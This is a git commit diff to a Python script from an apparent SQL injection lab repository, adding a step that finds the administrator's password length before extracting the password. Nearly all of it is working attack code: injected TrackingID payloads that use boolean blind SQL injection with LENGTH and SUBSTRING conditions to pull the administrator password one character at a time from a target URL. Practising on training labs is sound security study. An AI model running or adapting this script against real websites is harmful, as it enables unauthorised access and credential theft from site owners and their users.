ca7fd2372fb25dacaa89029f115526cfc73cf522
Iman Ali <100008436+Imanali01@users.noreply.github.com>
2024-06-08 20:47:34 -0700

    Update script.py
    Added enumerate_password_length function

--- SQL Injection Labs/Blind SQL Injection with Conditional Responses/script.py
+++ SQL Injection Labs/Blind SQL Injection with Conditional Responses/script.py
@@ -18,11 +18,20 @@ def search_text(response):
     else:
         return False
 
-def enumerate_password():
+def enumerate_password_length():
+    for i in range(1, 21):
+        TrackingID = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
+        response = make_request(TrackingID)
+        if search_text(response):
+            password_length = i
+            break
+    return password_length
+    
+def enumerate_password(password_length):
     alphanumeric_characters = string.ascii_lowercase + string.digits
     password = ""
     print(f"Enumerating password...")
-    for i in range(1,21):
+    for i in range(1, password_length+1):
         for j in alphanumeric_characters:
             TrackingID = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
             response = make_request(TrackingID)
@@ -35,7 +44,14 @@ def enumerate_password():
 if __name__=="__main__":
     try:
         url = sys.argv[1]
-        enumerate_password()
+        print("Enumerating Password Length...")
+        password_length = enumerate_password_length()
+        print(f"Password Length: {password_length} characters ")
+        enumerate_password(password_length)
     except IndexError:
         print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://example.com")
+
+
+
+
 
